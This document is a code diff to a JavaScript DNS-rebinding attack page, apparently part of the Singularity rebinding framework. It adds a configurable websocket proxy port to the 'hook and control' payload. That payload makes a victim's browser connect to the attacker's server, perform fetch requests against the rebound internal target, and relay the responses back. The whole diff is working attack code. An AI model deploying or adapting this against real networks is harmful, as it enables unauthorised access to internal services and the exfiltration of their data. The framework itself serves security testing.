@@ -13,6 +13,7 @@ const Rebinder = () => {
     let xhr = null;
     let payload = null;
     let interval = 60000;
+    let wsproxyport = 3129;
 
     function initCommsWithParentFrame() {
         window.addEventListener("message", function (e) {
@@ -27,6 +28,9 @@ const Rebinder = () => {
                     break;
                 case "indextoken":
                     indextoken = e.data.param;
+                    break;
+                case "wsproxyport":
+                    wsproxyport = e.data.param;
                     break;
                 case "flushdns":
                     if (e.data.param.flushDns === true) {
@@ -98,7 +102,7 @@ const Rebinder = () => {
                 // Terminate the attack
                 const rebindingStatusEl = document.getElementById('rebindingstatus');
                 rebindingStatusEl.innerText = `DNS rebinding successful!`;
-                rebindingDoneFn(payload, headers, cookie, body);
+                rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
             })
             .catch(function (error) {
                 if (error instanceof TypeError) { // We cannot establish an HTTP connection
@@ -157,15 +161,15 @@ function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }
 
 // Request target to establish a websocket to Singularity server and wait for commands
 // Implements retries to handle multiple answer strategy and firewall blocks.
-function webSocketHook(initialCookie, retry) {
+function webSocketHook(initialCookie, wsProxyPort, retry) {
     if (retry < 0) {
         console.log(`Abandoning websocket connection to Singularity after too many retries for: ${window.location.host}`);
         return;
     }
 
     const serverIp = document.location.hostname.split('-')[1]
-    //TKTK allocate port for hook and control payload and multi a strategy
-    const wsurl = document.location.port ? `${serverIp}:${document.location.port}` :
+    //const wsurl = document.location.port ? `${serverIp}:${document.location.port}` :
+    const wsurl = document.location.port ? `${serverIp}:${wsProxyPort}` :
     `${serverIp}`;
 
     let ws = new WebSocket(`ws://${wsurl}/soows`);
@@ -208,8 +212,8 @@ function webSocketHook(initialCookie, retry) {
                 ws.send(JSON.stringify(fetchResponse));
             }).catch(function (e) {
                 console.log(`Hook and command payload's fetch failed for frame ${window.location}: ${e}`);
-                if (n === 1) throw error;
-                return fetch_retry(url, options, n - 1);
+                if (n === 1) throw "Hook and command payload's fetch failed";
+                wait(1000).then( () => {return fetch_retry(url, options, n - 1);})
             });;
 
             fetch_retry(data.payload.url, data.payload.fetchrequest, 10);
@@ -225,7 +229,7 @@ function webSocketHook(initialCookie, retry) {
     wait(1000)
         .then(() => {
             if (ws.readyState !== 1) {
-                webSocketHook(initialCookie, retry - 1);
+                webSocketHook(initialCookie, wsProxyPort, retry - 1);
             } else {
                 console.log(`Successfully connected to Singularity via websockets for: ${window.location.host}`);
             }
